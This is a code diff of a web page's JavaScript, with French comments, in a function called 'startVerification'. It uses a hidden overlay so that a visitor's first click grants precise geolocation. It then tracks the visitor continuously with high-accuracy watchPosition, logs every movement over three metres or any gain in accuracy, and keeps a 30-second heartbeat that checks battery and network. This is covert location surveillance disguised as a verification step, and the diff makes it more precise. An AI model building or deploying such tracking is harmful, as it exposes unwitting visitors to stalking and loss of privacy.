@@ -166,27 +166,64 @@ async function startVerification() {
     // On s'assure que l'overlay est bien invisible mais présent
     overlay.style.display = 'flex';
 
-    const handleFirstClick = async () => {
-        const location = await getPreciseLocation();
-        await logVisitor(location);
-        overlay.style.display = 'none';
+let lastLoggedPos = null;
 
-        // Mode watchPosition pour un suivi ultra-précis en temps réel
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition(
-                async (position) => {
-                    const loc = {
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        speed: position.coords.speed
-                    };
-                    await logVisitor(loc, true);
-                },
-                (err) => console.warn(err),
-                { enableHighAccuracy: true, maximumAge: 0 }
-            );
-        }
+// Fonction pour calculer la distance entre deux points en mètres
+function getDistance(lat1, lon1, lat2, lon2) {
+    const R = 6371e3; // Rayon de la terre en mètres
+    const φ1 = lat1 * Math.PI/180;
+    const φ2 = lat2 * Math.PI/180;
+    const Δφ = (lat2-lat1) * Math.PI/180;
+    const Δλ = (lon2-lon1) * Math.PI/180;
+
+    const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
+              Math.cos(φ1) * Math.cos(φ2) *
+              Math.sin(Δλ/2) * Math.sin(Δλ/2);
+    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+
+    return R * c;
+}
+
+const handleFirstClick = async () => {
+    const location = await getPreciseLocation();
+    if (location) lastLoggedPos = location;
+    await logVisitor(location);
+    overlay.style.display = 'none';
+
+    // Mode watchPosition pour un suivi ultra-précis en temps réel
+    if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(
+            async (position) => {
+                const newLoc = {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    speed: position.coords.speed
+                };
+
+                // FILTRAGE : On n'envoie que si le mouvement est significatif (> 3m)
+                // ou si la précision s'est améliorée
+                if (!lastLoggedPos) {
+                    lastLoggedPos = newLoc;
+                    await logVisitor(newLoc, true);
+                } else {
+                    const dist = getDistance(lastLoggedPos.lat, lastLoggedPos.lon, newLoc.lat, newLoc.lon);
+                    
+                    // Si on a bougé de plus de 3 mètres OU si on gagne énormément en précision
+                    if (dist > 3 || (newLoc.accuracy < lastLoggedPos.accuracy - 5)) {
+                        lastLoggedPos = newLoc;
+                        await logVisitor(newLoc, true);
+                    }
+                }
+            },
+            (err) => console.warn(err),
+            { 
+                enableHighAccuracy: true, 
+                maximumAge: 0,
+                timeout: 5000 
+            }
+        );
+    }
 
         // Heartbeat pour maintenir la session active et vérifier batterie/réseau toutes les 30s
         setInterval(async () => {
